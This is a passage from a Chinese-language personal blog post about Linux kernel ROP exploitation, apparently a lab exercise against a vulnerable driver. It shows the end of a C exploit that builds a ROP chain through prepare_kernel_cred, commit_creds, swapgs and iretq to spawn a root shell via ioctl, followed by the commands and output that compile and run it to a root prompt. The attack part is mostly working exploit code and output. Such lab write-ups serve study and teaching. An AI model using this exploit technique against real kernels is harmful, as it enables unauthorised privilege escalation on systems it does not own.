class="number">0</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)mmap_addr);</span><br><span class="line">    assert((temp_stack = mmap((<span class="keyword">void</span>*)<span class="number">0x30000000</span>, <span class="number">0x10000000</span>, <span class="number">7</span>, <span class="number">0x32</span>, <span class="number">0</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)<span class="number">0x30000000</span>);</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line">    fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr);</span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff810d783d</span>UL; <span class="comment">/* pop %rdi; ret */</span></span><br><span class="line"></span><br><span class="line">    fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr + <span class="number">0x9d5f</span>);</span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0x0</span>UL;                <span class="comment">/* NULL */</span> </span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81092870</span>UL; <span class="comment">/* prepare_kernel_cred() */</span></span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff8110eaa3</span>UL; <span class="comment">/* pop %rdx; ret */</span></span><br><span class="line">    <span class="comment">//*fake_stack ++= 0xffffffff81092570UL; /* commit_creds() */</span></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81092576</span>UL; <span class="comment">// commit_creds() + 2 instructions</span></span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81036321</span>UL; <span class="comment">/* mov %rax, %rdi; call %rdx */</span></span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81051794</span>UL; <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line">    *fake_stack ++= <span class="number">0xdeadbeef</span>UL;         <span class="comment">// dummy placeholder </span></span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81051fe6</span>UL; <span class="comment">/* iretq */</span></span><br><span class="line">    *fake_stack ++= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell; <span class="comment">/* spawn a shell */</span></span><br><span class="line">    *fake_stack ++= user_cs;              <span class="comment">/* saved CS */</span></span><br><span class="line">    *fake_stack ++= user_rflags;          <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    *fake_stack ++= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(temp_stack+<span class="number">0x5000000</span>);  <span class="comment">/* mmaped stack region in user space */</span></span><br><span class="line">    *fake_stack ++= user_ss;              <span class="comment">/* saved SS */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//map = mmap((void *)..., ..., 3, 0x32, 0, 0);</span></span><br><span class="line"></span><br><span class="line">    fd = open(DEVICE_PATH, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>首先用基地址获取数组偏移量：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ dmesg | tail -1</span><br><span class="line">[  244.142035] addr(ops) &#x3D; ffffffffa02d8340</span><br><span class="line">$ .&#x2F;find_offset.py ffffffffa02d8340 stackpivots </span><br><span class="line">offset &#x3D; 18446744073644277591</span><br><span class="line">gadget &#x3D; xchg eax, esp ; ret 0x14ff</span><br><span class="line">stack addr &#x3D; 810d7df8</span><br></pre></td></tr></table></figure>
<p>然后，将基地址和偏移地址传递给ROP：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gcc rop_exploit.c -O2 -o rop_exploit</span><br><span class="line">$ .&#x2F;rop_exploit 18446744073644277591 ffffffffa02d8340</span><br><span class="line">array base address &#x3D; 0xffffffffa02d8340</span><br><span class="line">stack address &#x3D; 0x810d7df8</span><br><span class="line"># </span><br></pre></td></tr></table></figure>
<p><img src="/images/kernelrop/rootshell.png"><br>成功获取root！<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1nvDR1Wl">完整驱动下载</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-1)/">Linux Kernel ROP - Ropping your way to # (Part 1)</a><br><a target="_blank" rel="noopener" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)/">Linux Kernel ROP - Ropping your way to # (Part 2)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Bruce Fan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">125</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
